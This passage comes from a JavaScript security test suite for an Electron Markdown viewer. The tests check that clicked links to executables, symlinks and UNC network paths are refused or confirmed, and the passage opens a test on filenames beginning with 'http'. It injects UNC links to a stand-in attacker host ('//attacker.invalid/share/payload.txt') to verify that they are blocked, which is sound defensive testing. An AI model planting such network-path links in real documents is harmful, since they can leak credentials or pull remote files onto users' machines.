        check("SEC-12 terminal accounting rejects late or unattributed effects", false,
          JSON.stringify({ sealed, now, faults, navigation }));
        throw new Error("SEC-12 has late effects or changed observation authority");
      }
    }
    async function waitLocal(predicate, label) {
      const deadline = Date.now() + 12000;
      for (;;) {
        if (!samePage() || faults.length || navigation.length || !securityDialogGuardsIntact()) {
          throw new Error("SEC-12 authority/navigation failure during " + label + ": " + faults.join("; "));
        }
        const value = await predicate();
        if (value) return value;
        if (Date.now() >= deadline) throw new Error("SEC-12 timed out: " + label);
        await sleep(40);
      }
    }
    async function requireSource(label) {
      const owner = await readSecurityImageOwner(sourcePath);
      const ok = securityImageOwnerMatches(owner, sourcePath, sourceBody, sourceHeading) &&
        owner.id === source.id && isDeepStrictEqual(owner.identity, source.identity) &&
        isDeepStrictEqual(owner.descriptor, source.descriptor) && owner.images.length === 0 &&
        fs.readFileSync(sourcePath, "utf8") === sourceBody && samePage();
      check("SETUP SEC-12 exact admitted source remains current and clean: " + label,
        ok, JSON.stringify(owner));
      if (!ok) throw new Error("SEC-12 source ownership is uncertain: " + label);
      return owner;
    }
    async function enterSource(file, body, heading, carriers) {
      await assertNoLate();
      source = await admitSecurityImageFixture(file, body, heading, [], []);
      sourcePath = file; sourceBody = body; sourceHeading = heading;
      knownOwners.set(source.id, source);
      const links = await exec(`Array.from(document.querySelectorAll('#viewer a'), a =>
        [a.textContent.trim(), a.getAttribute('href')])`);
      check("SETUP SEC-12 exact sanitizer-retained link inventory: " + heading,
        isDeepStrictEqual(links, carriers), JSON.stringify(links));
      if (!isDeepStrictEqual(links, carriers)) throw new Error("SEC-12 link inventory changed");
      await assertNoLate();
    }
    async function leaveSource() {
      await assertNoLate();
      await requireSource("before source retirement");
      await closeSecurityImageFixture(source, sourcePath, sourceBody, sourceHeading);
      source = null;
      await assertNoLate();
      if (faults.length || expectedSecurityQuestion !== null) {
        throw new Error("SEC-12 source retirement left an unsettled observation");
      }
    }
    async function answerExpectedQuestion(action, allowance, choice) {
      await waitLocal(() => action.question?.request.displayed === true && action.question,
        "actual owned question display");
      const question = action.question, request = question.request, child = request.window;
      const childContents = child.webContents;
      const preferences = childContents.getLastWebPreferences();
      const appearance = await childContents.executeJavaScript(`({
        title: document.getElementById('appMessageTitle')?.textContent,
        text: document.getElementById('appMessageText')?.textContent,
        buttons: Array.from(document.querySelectorAll('[data-dialog-choice]'), button => ({
          label: button.textContent, id: button.dataset.dialogChoice,
          visible: button.getClientRects().length > 0 && !button.disabled,
        })),
        focused: document.activeElement?.dataset.dialogChoice,
        open: !!document.querySelector('dialog[open]'), node: typeof require,
      })`, true);
      const ready = allowance.consumed && expectedSecurityQuestion === null &&
        !request.done && request.owner === win && request.sender === contents && request.frame === frame &&
        request.options.isCurrent() === true && question.broker.current(request) === true &&
        question.broker.owners.get(win)?.active === request && request.state.queue.length === 0 &&
        child.getParentWindow() === win && child.isVisible() && !child.isDestroyed() &&
        childContents.session !== contents.session && childContents.mainFrame.url === question.broker.url &&
        question.broker.requests.get(request.id) === request &&
        preferences.sandbox === true && preferences.contextIsolation === true &&
        preferences.nodeIntegration === false && appearance.node === "undefined" &&
        appearance.open && appearance.title === "Open external file" &&
        appearance.text === `Open "${allowance.basename}" with its system application?` &&
        isDeepStrictEqual(appearance.buttons, [
          { label: "Cancel", id: "0", visible: true }, { label: "Open", id: "1", visible: true },
        ]) && appearance.focused === "0" &&
        request.presentation.defaultId === 0 && request.presentation.cancelId === 0;
      check("SETUP SEC-12 expected real question has exact labels and default Cancel focus: " +
        action.label, ready, JSON.stringify(appearance));
      if (!ready) throw new Error("SEC-12 owned question is not the expected visible presentation");
      let closed;
      const closing = new Promise(resolve => {
        closed = resolve;
        child.once("closed", closed);
      });
      try {
        // Only this explicit, already-verified button is selected. Destruction
        // may win the evaluation response, but never substitutes for Main's result.
        await Promise.race([closing, childContents.executeJavaScript(`(() => {
          const button = document.querySelector('[data-dialog-choice="${choice}"]');
          if (!button || button.disabled || !button.getClientRects().length) {
            throw new Error('Expected choice is not visible');
          }
          button.click();
          return true;
        })()`, true)]);
        await waitLocal(() => question.settled && request.done && child.isDestroyed() &&
          childContents.isDestroyed() && !question.broker.owners.has(win),
        "actual owned question result and child retirement");
      } finally { child.removeListener("closed", closed); }
      const result = question.result;
      const accepted = !question.error && result?.response === choice && result.cause === "choice" &&
        result.failed === false && result.displayed === true;
      check("SEC-12 explicit question choice settles through the actual broker: " + action.label,
        accepted, JSON.stringify({ result, error: question.error }));
      if (!accepted) throw new Error("SEC-12 question did not settle with its explicit visible choice");
    }
    async function readRetainedSource() {
      return exec(`(() => {
        const tabs = window.CustomTabs;
        const tab = tabs.getTabs().find(item => item.id === ${source.id});
        return tab ? {
          id: tab.id, path: tab.filePath, content: tab.content, original: tab.originalContent,
          markedDirty: tab.hasUnsavedChanges, state: tabs.__documentState(tab),
          descriptor: tabs.getDocumentDescriptor(tab.id),
          identity: tabs.getDocumentIdentityForTab(tab.id, ${JSON.stringify(sourcePath)},
            window.getReloadRequestSession()),
        } : null;
      })()`);
    }
    async function retireLinkedTarget() {
      let target, retained;
      await waitLocal(async () => {
        target = await readSecurityImageOwner(linkedPath);
        retained = await readRetainedSource();
        return securityLocalTargetMatches(target, retained, source, sourcePath, sourceBody,
          linkedPath, linkedBody, "Security linked target");
      }, "actual linked document read, admission and two-tab DOM");
      knownOwners.set(target.id, target);
      const actual = securityLocalTargetMatches(target, retained, source, sourcePath, sourceBody,
        linkedPath, linkedBody, "Security linked target") &&
        fs.readFileSync(linkedPath, "utf8") === linkedBody &&
        fs.readFileSync(sourcePath, "utf8") === sourceBody;
      check("SETUP SEC-12 Markdown target and retained source have exact actual two-tab identities",
        actual, JSON.stringify({ target, retained }));
      if (!actual) throw new Error("SEC-12 refuses to retire an unproven linked target");
      try {
        await exec(`(() => {
        const dialogs = window.MarkalooDialogs;
        if (!dialogs || typeof dialogs.show !== 'function' ||
            window.__securityLocalTargetClose || document.querySelector('#appMessageDialog[open]')) {
          throw new Error('Target retirement starts with an unexpected dialog/observer');
        }
        const observation = window.__securityLocalTargetClose = {
          dialogs, confirm: window.confirm, calls: [], confirmations: [],
          opened: false, done: false, error: null,
          dialogsDescriptor: Object.getOwnPropertyDescriptor(window, 'MarkalooDialogs'),
          confirmDescriptor: Object.getOwnPropertyDescriptor(window, 'confirm'),
        };
        window.__securityLocalLinks.targetClose = observation;
        observation.observedDialogs = Object.freeze({ ...dialogs, show(...args) {
          observation.calls.push(String(args[0]?.title || 'untitled'));
          return dialogs.show(...args);
        } });
        window.MarkalooDialogs = observation.observedDialogs;
        observation.observedConfirm = message => {
          observation.confirmations.push(String(message));
          throw new Error('Unexpected linked-target confirmation');
        };
        window.confirm = observation.observedConfirm;
        observation.observer = new MutationObserver(records => {
          if (document.querySelector('#appMessageDialog[open]') ||
              records.some(record => record.target.id === 'appMessageDialog' &&
                record.attributeName === 'open' && record.oldValue !== null)) observation.opened = true;
        });
        observation.observer.observe(document.body, {
          subtree: true, childList: true, attributes: true,
          attributeFilter: ['open'], attributeOldValue: true,
        });
        Promise.resolve().then(() => {
          const tabs = window.CustomTabs, tab = tabs.getActiveTab();
          const state = tab && tabs.__documentState(tab), pending = window.getPendingSaveStatus();
          if (tab?.id !== ${target.id} || tab.filePath !== ${JSON.stringify(linkedPath)} ||
              tab.content !== ${JSON.stringify(linkedBody)} ||
              tab.originalContent !== ${JSON.stringify(linkedBody)} || tab.hasUnsavedChanges ||
              window.currentFilePath !== ${JSON.stringify(linkedPath)} ||
              window.originalMarkdown !== ${JSON.stringify(linkedBody)} ||
              pending.pending || pending.count !== 0 || !state?.maintained || state.dirty ||
              !state.liveWitnessMatchesContent || tabs.getTabs().length !== 2 ||
              document.querySelector('#viewer h1')?.textContent !== 'Security linked target' ||
              document.getElementById('loadingScreen')?.classList.contains('active') !== false ||
              JSON.stringify(tabs.getDocumentDescriptor()) !== ${JSON.stringify(JSON.stringify(target.descriptor))} ||
              JSON.stringify(tabs.getActiveDocumentIdentity(${JSON.stringify(linkedPath)},
                window.getReloadRequestSession())) !== ${JSON.stringify(JSON.stringify(target.identity))}) {
            throw new Error('Linked target changed before its real close');
          }
          return tabs.closeTab(${target.id});
        })
          .then(() => { observation.done = true; }, error => {
            observation.error = String(error?.stack || error); observation.done = true;
          });
        return true;
      })()`);
        await waitLocal(async () => {
          const closed = await exec(`(() => {
            const o = window.__securityLocalTargetClose;
            return { done: o.done, error: o.error, calls: o.calls, confirmations: o.confirmations,
              opened: o.opened || !!document.querySelector('#appMessageDialog[open]'),
              observing: window.MarkalooDialogs === o.observedDialogs &&
                window.confirm === o.observedConfirm };
          })()`);
          if (!closed.observing || closed.error || closed.opened ||
              closed.calls.length || closed.confirmations.length) {
            check("SEC-12 target retirement never answers unexpected application consent",
              false, JSON.stringify(closed));
            throw new Error("SEC-12 linked-target close encountered unexpected consent or failure");
          }
          return closed.done;
        }, "clean linked-target close");
        await waitLocal(async () => {
          const after = await readSecurityImageOwner(sourcePath);
          return securityImageOwnerMatches(after, sourcePath, sourceBody, sourceHeading) &&
            after.id === source.id && isDeepStrictEqual(after.identity, source.identity) &&
            isDeepStrictEqual(after.descriptor, source.descriptor) && after.images.length === 0;
        }, "original source sole-owner restoration after actual target retirement");
        await requireSource("after actual linked-target retirement");
      } finally {
        await restoreTargetClose();
      }
      return true;
    }
    async function requireKnownPageOwners() {
      if (!samePage()) throw new Error("Local witness belongs to a lost page; fixtures retained");
      const owners = await exec(`window.CustomTabs.getTabs().map(tab => ({
        id: tab.id, path: tab.filePath, descriptor: window.CustomTabs.getDocumentDescriptor(tab.id),
        identity: window.CustomTabs.getDocumentIdentityForTab(tab.id, tab.filePath,
          window.getReloadRequestSession()),
      }))`);
      if (owners.some(owner => {
        const known = knownOwners.get(owner.id);
        return !known || owner.path !== known.path ||
          !isDeepStrictEqual(owner.descriptor, known.descriptor) ||
          !isDeepStrictEqual(owner.identity, known.identity);
      })) throw new Error("Unknown owner during local witness disposal; fixtures retained");
      await readPage();
    }
    async function restoreTargetClose() {
      await requireKnownPageOwners();
      await exec(`(() => {
        const probe = window.__securityLocalLinks, o = probe.targetClose;
        if (!o && !window.__securityLocalTargetClose) return true;
        if (!o || window.__securityLocalTargetClose !== o) {
          throw new Error('Target-close witness lost ownership');
        }
        const failures = [];
        try { o.observer?.disconnect(); } catch { failures.push('observer'); }
        try {
          if (window.MarkalooDialogs !== o.observedDialogs) throw new Error('ownership');
          if (o.dialogsDescriptor) Object.defineProperty(window, 'MarkalooDialogs', o.dialogsDescriptor);
          else delete window.MarkalooDialogs;
          if (window.MarkalooDialogs !== o.dialogs) throw new Error('identity');
        } catch { failures.push('dialogs'); }
        try {
          if (window.confirm !== o.observedConfirm) throw new Error('ownership');
          if (o.confirmDescriptor) Object.defineProperty(window, 'confirm', o.confirmDescriptor);
          else delete window.confirm;
          if (window.confirm !== o.confirm) throw new Error('identity');
        } catch { failures.push('confirm'); }
        if (!failures.length) {
          delete window.__securityLocalTargetClose; delete probe.targetClose;
        }
        if (failures.length) throw new Error('Target-close restoration lost ownership: ' + failures);
        return true;
      })()`);
    }
    async function s12Click(label, href, name, outcome, choice = null) {
      await assertNoLate();
      await requireSource(label);
      await assertNoLate();
      const before = sealed;
      const action = { id: actions.length + 1, label, href, target: targets.get(name),
        source, pending: true, entries: 0, settled: false, entry: null, question: null };
      actions.push(action);
      const point = await exec(`(async () => {
        const links = Array.from(document.querySelectorAll('#viewer a'))
          .filter(a => a.textContent.trim() === ${JSON.stringify(label)});
        if (links.length !== 1 || links[0].getAttribute('href') !== ${JSON.stringify(href)}) {
          throw new Error('Exact local link carrier is missing');
        }
        const a = links[0], probe = window.__securityLocalLinks;
        a.scrollIntoView({ block: 'center', inline: 'center', behavior: 'instant' });
        await new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)));
        const r = a.getBoundingClientRect();
        const x = Math.round(r.left + r.width / 2), y = Math.round(r.top + r.height / 2);
        const hit = document.elementFromPoint(x, y)?.closest('#viewer a');
        probe.target = a;
        return { x, y, hit: hit === a, width: r.width, height: r.height,
          href: a.getAttribute('href'), text: a.textContent.trim() };
      })()`);
      const hit = point.hit && point.width > 0 && point.height > 0 &&
        point.href === href && point.text === label;
      check("SETUP SEC-12 exact visible anchor is the actual pointer hit target: " + label,
        hit, JSON.stringify(point));
      if (!hit) throw new Error("SEC-12 trusted pointer has no exact hit target");
      await requireSource("pointer-ready " + label);
      await assertNoLate();
      let allowance = null;
      activeAction = action;
      try {
        if (choice !== null) {
          if (expectedSecurityQuestion !== null || !action.target) {
            throw new Error("SEC-12 expected-question slot is not empty");
          }
          allowance = {
            action, win, contents, frame, pageUrl, href, choice,
            documentRef: source.descriptor.ref, basename: path.basename(action.target.real),
            consumed: false,
            isCurrent: () => activeAction === action && source === action.source && samePage() &&
              faults.length === 0 && navigation.length === 0 &&
              action.pending && !action.settled && action.entry?.documentRef === source.descriptor.ref &&
              fileWork.some(item => item.action === action.id && item.kind === "realpath" &&
                item.file === action.target.logical && item.resolved === action.target.real) &&
              fileWork.some(item => item.action === action.id && item.kind === "stat" &&
                item.file === action.target.real && item.regular === true && item.directory === false),
          };
          expectedSecurityQuestion = allowance;
        }
        contents.sendInputEvent({ type: "mouseDown", x: point.x, y: point.y,
          button: "left", clickCount: 1 });
        contents.sendInputEvent({ type: "mouseUp", x: point.x, y: point.y,
          button: "left", clickCount: 1 });
        await waitLocal(async () => {
          const page = await readPage();
          return page.clicks.length > before.clicks && action.entry;
        }, "trusted input and actual Main entry for " + label);
        if (choice !== null) {
          await waitLocal(() => action.question || action.settled,
            "actual expected-question entry or Main settlement for " + label);
          if (action.question) await answerExpectedQuestion(action, allowance, choice);
        }
        await waitLocal(() => action.settled, "actual Main handler settlement for " + label);
        if (action.error) throw new Error("SEC-12 actual Main handler rejected: " + action.error);
        expectedSecurityQuestion = null;
        let targetRetired = false;
        const terminalDeliveries = securityLocalSlice(sends, before.sends);
        const terminalOffers = terminalDeliveries.filter(item => item.channel === "external-file-open-request");
        if (outcome === "document" && terminalOffers.length === 1 &&
            terminalOffers[0].path === linkedPath) targetRetired = await retireLinkedTarget();
        const terminalNotices = terminalDeliveries.filter(item => item.channel === "show-error");
        if (terminalNotices.length) {
          await waitLocal(async () => {
            const page = await readPage();
            return page.errors.length >= before.errors + terminalNotices.length &&
              page.notification.visible && page.notification.text === terminalNotices.at(-1).message;
          }, "typed public refusal delivery and visible notification for " + label);
        }
        await requireSource("terminal " + label);
        await pageBarrier();
        const page = await readPage();
        const clicks = securityLocalSlice(page.clicks, before.clicks);
        const errors = securityLocalSlice(page.errors, before.errors);
        const opened = securityLocalSlice(await visualUtils.readShellOpens(win), before.shell);
        const external = securityLocalSlice(await visualUtils.readExternalOpens(win), before.external);
        const deliveries = securityLocalSlice(sends, before.sends);
        const work = securityLocalSlice(fileWork, before.work);
        const routed = securityLocalSlice(entries, before.entries);
        const navigations = securityLocalSlice(navigation, before.navigation);
        const observedFaults = securityLocalSlice(faults, before.faults);
        const offers = deliveries.filter(item => item.channel === "external-file-open-request");
        const notices = deliveries.filter(item => item.channel === "show-error");
        const refused = outcome === "refuse";
        const expectedMessage = !refused ? null : name === "remote" ?
          "Network file paths are blocked" :
          "Executable links are blocked: " + path.basename(action.target.real);
        const localFS = name === "remote" ? work.length === 0 :
          work.some(item => item.kind === "realpath" && item.file === action.target.logical &&
            item.resolved === action.target.real && item.terminal && !item.error) &&
          work.some(item => item.kind === "stat" && item.file === action.target.real &&
            item.regular === (name !== "subfolder") && item.directory === (name === "subfolder") &&
            item.terminal && !item.error);
        const explicitConsent = choice === null ? action.question === null :
          allowance.consumed && action.question?.settled &&
          action.question.result?.response === choice && action.question.result?.cause === "choice" &&
          action.question.request.window.isDestroyed() &&
          !action.question.broker.owners.has(win);
        const ok = clicks.length === 1 && clicks[0].href === href && clicks[0].text === label &&
          clicks[0].selected && clicks[0].trusted && clicks[0].canceled &&
          routed.length === 1 && routed[0] === action.entry && action.entries === 1 &&
          action.entry.documentRef === action.source.descriptor.ref &&
          action.result === (!refused && outcome !== "cancel") &&
          opened.length === (outcome === "open" ? 1 : 0) &&
          (outcome !== "open" || opened[0] === action.target.real) &&
          external.length === 0 && offers.length === (outcome === "document" ? 1 : 0) &&
          (outcome !== "document" || offers[0].path === linkedPath && targetRetired) &&
          notices.length === (refused ? 1 : 0) && errors.length === (refused ? 1 : 0) &&
          (!refused || notices[0].message === expectedMessage && errors[0].message === expectedMessage &&
            errors[0].visible && errors[0].text === expectedMessage &&
            page.notification.visible && page.notification.text === expectedMessage) &&
          deliveries.every(item => item.action === action.id) &&
          work.every(item => item.action === action.id && !item.forbidden && item.terminal && !item.error) &&
          localFS && explicitConsent && expectedSecurityQuestion === null &&
          navigations.length === 0 && observedFaults.length === 0 && await waitForExternalTrap(win);
        const report = { ok, entry: action.entry, result: action.result, clicks, opened, external,
          offers, notices, errors, work, question: action.question ? {
            result: action.question.result, displayed: action.question.request.displayed,
            destroyed: action.question.request.window.isDestroyed(),
          } : null, targetRetired };
        // Never resample a baseline here: effects arriving during validation or
        // the following awaited count must disagree with these exact endpoints.
        sealed = securityLocalSeal(before, {
          shell: opened, external, sends: deliveries, entries: routed, work,
          navigation: navigations, clicks, errors, faults: observedFaults,
        });
        action.pending = false;
        activeAction = null;
        await assertNoLate();
        return report;
      } finally {
        expectedSecurityQuestion = null;
        action.pending = false;
        activeAction = null;
      }
    }
    function assertCase(name, result) { check(name, result.ok, JSON.stringify(result)); }
    // Both shared trap snapshots are requested in one Main turn, before local
    // observation starts. Newly owned histories must still be empty after setup.
    const startingOpens = await Promise.all([
      visualUtils.readShellOpens(win), visualUtils.readExternalOpens(win),
    ]);
    const startingSeal = Object.freeze({
      shell: startingOpens[0].length, external: startingOpens[1].length,
      sends: 0, entries: 0, work: 0, navigation: 0, clicks: 0, errors: 0, faults: 0,
    });
    securityGestureRegistration.observer = observer;
    contents.send = observedSend;
    realPathHost.native = observedRealPath;
    fs.statSync = observedStat;
    contents.on("will-frame-navigate", observeFrameNavigation);
    contents.on("will-navigate", observeNavigation);
    contents.on("did-start-navigation", observeStartedNavigation);
    try {
      await exec(`(() => {
        if (window.__securityLocalLinks) throw new Error('Local link witness already exists');
        const probe = window.__securityLocalLinks = {
          clicks: [], errors: [], target: null, tabs: window.CustomTabs, folia: window.folia,
          pageSession: window.getReloadRequestSession(),
        };
        probe.capture = event => {
          const a = event.target?.closest?.('#viewer a');
          if (a) probe.clicks.push({ event, href: a.getAttribute('href'),
            text: a.textContent.trim(), selected: a === probe.target });
        };
        window.addEventListener('click', probe.capture, true);
        probe.unsubscribe = window.folia.onError(message => {
          const toast = document.getElementById('notificationToast');
          const text = document.getElementById('notificationMessage');
          probe.errors.push({ message, text: text?.textContent,
            visible: !!toast && toast.classList.contains('show') &&
              toast.getClientRects().length > 0 && getComputedStyle(toast).visibility !== 'hidden' });
        });
        return true;
      })()`);
      pageInstalled = true;
      sealed = startingSeal;
      await assertNoLate();
      await enterSource(s12doc, localBody, "Local links", [
        ["exe", "./setup.exe"], ["ps1", "./script.ps1"], ["docm", "./report.docm"],
        ["txt", "./notes.txt"], ["svg", "./diagram.svg"], ["md", "./linked.md"],
        ["unc", "//attacker.invalid/share/payload.txt"],
      ]);
      for (const [label, text, name] of [
        ["Windows executable", "exe", "setup.exe"],
        ["PowerShell script", "ps1", "script.ps1"],
        ["macro-enabled Office document", "docm", "report.docm"],
      ]) {
        assertCase(`SEC-12 a link to a ${label} is refused outright`,
          await s12Click(text, "./" + name, name, "refuse"));
      }
      const s12Txt = await s12Click("txt", "./notes.txt", "notes.txt", "open");
      assertCase("FEATURE an inert document (.txt) still opens without a prompt", s12Txt);
      check("SETUP SEC-12 actual local filesystem recorder is alive on the inert target",
        s12Txt.work.some(item => item.kind === "realpath") &&
          s12Txt.work.some(item => item.kind === "stat" && item.regular), JSON.stringify(s12Txt.work));
      assertCase("FEATURE a markdown link still opens inside the app, never via the shell",
        await s12Click("md", "./linked.md", "linked.md", "document"));
      assertCase("SEC-12 an unrecognised type asks first, and declining opens nothing",
        await s12Click("svg", "./diagram.svg", "diagram.svg", "cancel", 0));
      assertCase("FEATURE accepting the prompt opens the unrecognised type",
        await s12Click("svg", "./diagram.svg", "diagram.svg", "open", 1));
      assertCase("SEC-12 a protocol-relative UNC link is blocked and never reaches the filesystem",
        await s12Click("unc", "//attacker.invalid/share/payload.txt", "remote", "refuse"));
      // marked consumes backslash escapes, so retain the original real-DOM
      // injection while using the same trusted actor and Main policy evidence.
      const uncHref = "\\\\attacker.invalid\\share\\payload.txt";
      await exec(`(() => {
        const a = document.createElement('a');
        a.setAttribute('href', ${JSON.stringify(uncHref)}); a.textContent = 'unc2';
        window.__securityLocalLinks.injected = a;
        document.getElementById('viewer').appendChild(a);
        return true;
      })()`);
      assertCase("SEC-12 a backslash UNC link is blocked before Main filesystem access touches the network",
        await s12Click("unc2", uncHref, "remote", "refuse"));
      await exec(`(() => {
        const probe = window.__securityLocalLinks;
        if (probe.injected?.getAttribute('href') !== ${JSON.stringify(uncHref)} ||
            probe.injected.parentElement !== document.getElementById('viewer')) {
          throw new Error('Injected UNC witness lost its owner');
        }
        probe.injected.remove(); delete probe.injected; return true;
      })()`);
      await leaveSource();
      await enterSource(resolutionPath, resolutionBody, "Resolution", [
        ["symlink", "./diagram-link.png"], ["folder", "./subfolder"],
      ]);
      if (symlinksAvailable) {
        assertCase("SEC-12 a symlink with a safe-looking name is judged by its real target",
          await s12Click("symlink", "./diagram-link.png", "diagram-link.png", "refuse"));
      }
      const s12Dir = await s12Click("folder", "./subfolder", "subfolder", "open");
      assertCase("FEATURE a link to a folder still opens it, and is not mistaken for an executable", s12Dir);
      check("SETUP SEC-12 actual local filesystem recorder distinguishes the real directory",
        s12Dir.work.some(item => item.kind === "stat" && item.directory && !item.regular),
        JSON.stringify(s12Dir.work));
      await leaveSource();
      await enterSource(extPath, extBody, "Ext", [["license", "./LICENSE"]]);
      assertCase("SEC-12 an extensionless file asks rather than being refused as an executable",
        await s12Click("license", "./LICENSE", "LICENSE", "open", 1));
      await leaveSource();
      await assertNoLate();
      const empty = await readSecurityImageOwner(null);
      await assertNoLate();
      const retired = empty.tabs.length === 0 && empty.id === null && empty.current === null &&
        empty.descriptor === null && empty.identity === null &&
        empty.pending.pending === false && empty.pending.count === 0 &&
        empty.welcome && empty.heading === "Welcome to Markaloo" && empty.loading === false &&
        actions.every(action => !action.pending && action.settled &&
          (!action.question || action.question.settled && action.question.request.window.isDestroyed()));
      check("SEC-12 local sources and expected questions retire before deferred N11", retired,
        JSON.stringify(empty));
      if (!retired) throw new Error("SEC-12 local owner retirement is incomplete");
    } catch (error) {
      localFailure = error;
      throw error;
    } finally {
      expectedSecurityQuestion = null;
      const restorationErrors = [];
      const restore = async (label, operation) => {
        try { await operation(); }
        catch (error) { restorationErrors.push(label + ": " + String(error.message || error)); }
      };
      const release = (label, operation) => {
        try { operation(); }
        catch (error) { restorationErrors.push(label + ": " + String(error.message || error)); }
      };
      let retiredPage = null, trapReady = false, finalEndpoints = null;
      // Main observations stay armed while owner checks and page disposal await
      // the renderer. The page returns its last endpoints as it releases itself.
      await restore("target-close witness", async () => {
        if (pageInstalled) await restoreTargetClose();
      });
      await restore("page witness", async () => {
        if (!pageInstalled) return;
        await requireKnownPageOwners();
        retiredPage = Object.freeze(await exec(`(() => {
          const probe = window.__securityLocalLinks;
          if (!probe || probe.tabs !== window.CustomTabs || probe.folia !== window.folia ||
              probe.pageSession !== window.getReloadRequestSession()) {
            throw new Error('Local link page disposal lost ownership');
          }
          if (probe.targetClose || window.__securityLocalTargetClose) {
            throw new Error('Target-close observation is still owned; retain its page witness');
          }
          window.removeEventListener('click', probe.capture, true);
          probe.unsubscribe();
          if (probe.injected?.isConnected) probe.injected.remove();
          const endpoints = { clicks: probe.clicks.length, errors: probe.errors.length };
          delete window.__securityLocalLinks;
          return endpoints;
        })()`));
      });
      await restore("shared trap readiness", async () => {
        trapReady = await waitForExternalTrap(win);
      });
      // Listener removal can invoke application callbacks. Finish it before the
      // protected snapshot/compare/property-restoration tail.
      release("navigation listeners", () => {
        contents.removeListener("will-frame-navigate", observeFrameNavigation);
        contents.removeListener("will-navigate", observeNavigation);
        contents.removeListener("did-start-navigation", observeStartedNavigation);
      });
      try {
        // Even immediate async readers yield after cloning. Snapshot the retained
        // Main counts synchronously; no await or application callback may separate
        // this finite endpoint comparison from releasing the owned properties.
        finalEndpoints = visualUtils.snapshotExternalOpenCounts();
      } catch (error) {
        restorationErrors.push("final shared histories: " + String(error.message || error));
      }
      const finalCounts = {
        shell: finalEndpoints?.shell ?? null, external: finalEndpoints?.external ?? null,
        sends: sends.length, entries: entries.length, work: fileWork.length,
        navigation: navigation.length, clicks: retiredPage?.clicks ?? null,
        errors: retiredPage?.errors ?? null, faults: faults.length,
      };
      const accounted = sealed !== null && isDeepStrictEqual(finalCounts, sealed) &&
        faults.length === 0 && navigation.length === 0 &&
        expectedSecurityQuestion === null && securityDialogGuardsIntact() && trapReady &&
        sharedTrapShell.openPath === trapOpeners.openPath &&
        sharedTrapShell.openExternal === trapOpeners.openExternal;
      try {
        restoreSecurityLocalSlot(securityGestureRegistration, "observer", observer, null,
          originalSlots.observer);
      } catch (error) {
        restorationErrors.push("Main gesture observer: " + String(error.message || error));
      }
      try {
        restoreSecurityLocalSlot(contents, "send", observedSend, realSend, originalSlots.send);
      } catch (error) {
        restorationErrors.push("Main send: " + String(error.message || error));
      }
      try {
        restoreSecurityLocalSlot(realPathHost, "native", observedRealPath, realPath, originalSlots.realPath);
      } catch (error) {
        restorationErrors.push("realpath: " + String(error.message || error));
      }
      try {
        restoreSecurityLocalSlot(fs, "statSync", observedStat, realStat, originalSlots.stat);
      } catch (error) {
        restorationErrors.push("stat: " + String(error.message || error));
      }
      // Reporting is outside the protected tail too: a logger is a callback.
      check("SEC-12 final immutable accounting covers owner verification and asynchronous disposal",
        accounted, JSON.stringify({ sealed, finalCounts, faults, navigation }));
      if (!accounted) restorationErrors.push("final immutable endpoint comparison failed");
      const restored = securityGestureRegistration.observer === null &&
        securityGestureRegistration.handler === registration.handler &&
        securityGestureRegistration.installed === registration.installed &&
        securityGestureRegistration.count === 1 && contents.send === realSend &&
        fs.realpathSync === realPathHost && realPathHost.native === realPath && fs.statSync === realStat &&
        isDeepStrictEqual(Object.getOwnPropertyDescriptor(contents, "send"), originalSlots.send) &&
        isDeepStrictEqual(Object.getOwnPropertyDescriptor(realPathHost, "native"), originalSlots.realPath) &&
        isDeepStrictEqual(Object.getOwnPropertyDescriptor(fs, "statSync"), originalSlots.stat) &&
        expectedSecurityQuestion === null && securityDialogGuardsIntact() &&
        trapReady && sharedTrapShell.openPath === trapOpeners.openPath &&
        sharedTrapShell.openExternal === trapOpeners.openExternal;
      check("SEC-12 scoped observations restore exact Main identities and disarmed guards",
        restored && restorationErrors.length === 0, JSON.stringify(restorationErrors));
      if (!restored || restorationErrors.length) {
        throw new Error("SEC-12 restoration failed; live/failed fixtures retained: " +
          restorationErrors.join("; ") +
          (localFailure ? "\nOriginal local failure: " + String(localFailure.stack || localFailure) : ""));
      }
    }
    // Keep s12dir and its immutable sources alive: unchanged N11 still creates
    // siblings there and retains its separate, pending legacy recovery contract.
  }

  // ==========================================================================
  // N11 - the click delegation was not TOTAL, and the hole was shaped like a
  // filename.
  //
  // Three arms decide what a click does: `#...` anchors, then http(s), then
  // local files. The http(s) arm tests the RESOLVED url (`link.href`); the
  // local-file arm tested the raw href ATTRIBUTE for `startsWith('http')`. A
  // sibling file called `httpd.md` or `https-notes.txt` satisfies NEITHER - the
  // attribute begins "http" so the local arm skipped it, and it resolves to
  // `file:` so the http arm skipped it too. No preventDefault ran, Chromium
  // followed the link natively, and main.js's will-navigate deny killed the
  // navigation. Net effect for the reader: the link does nothing at all, in
  // silence, with no notification and nothing in the renderer console.
  //
  // These are ordinary filenames - `httpd.conf`, `http-api.md`, `https-setup.md`
  // are exactly the sort of sibling a documentation repo contains - so this is
  // a real "some of my links are dead" bug, not a curiosity.
  //
  // The hrefs below are deliberately BARE (`httpd.md`, not `./httpd.md`). The
  // first draft of this block used the `./` form and all three assertions
  // passed against the unfixed code, because `./httpd.md` does not begin with
  // "http" and so took the local arm normally. The `./` prefix is optional in
  // markdown and most authors omit it, which is precisely why the bug is
  // reachable - and why the assertion has to pin the exact href it clicked.
  //
  // The third assertion is the one that guards the FIX rather than the bug: the
  // local arm is now a genuine catch-all, so it must be proved that an absolute
  // http(s) URL is still taken by the arm above it and never treated as a path.
  // `exists.length === 0` is the load-bearing conjunct there - if the catch-all
  // ever swallowed external URLs, the first observable symptom would be
  // fs.existsSync() being called on "http://probe.invalid/page".
  //
  // Ordinary input crosses the unchanged isolated preload into actual Main.
  // Bounded synchronous native realpath/stat
  // and exists/read observations replace the old renderer exists counter; they
  // do not claim to intercept every filesystem API. Shared histories, document
  // offers and real notification DOM replace the old renderer effect stubs.
  // Loss of the original page stops this actor; missing observations stay unknown.
  // ==========================================================================
  {
  fs.writeFileSync(path.join(s12dir, "https-notes.txt"), "placeholder");
  fs.writeFileSync(path.join(s12dir, "httpd.md"), "# httpd\n");

  // Every carrier begins in an exact, genuinely admitted source document.
  const N11_DOC = [
    "# Totality",
    "",
    "[txt](https-notes.txt)",
    "",
    "[md](httpd.md)",
    "",
    "[web](http://probe.invalid/page)",
    "",
    // An absolute URL Chromium's parser REJECTS - `PORT` is not a number, so
    // the port is invalid. That matters because `link.href` then hands back the
    // attribute verbatim instead of a normalised, lowercased URL, which is the
    // only way an uppercase scheme can reach the arms below. It is what makes
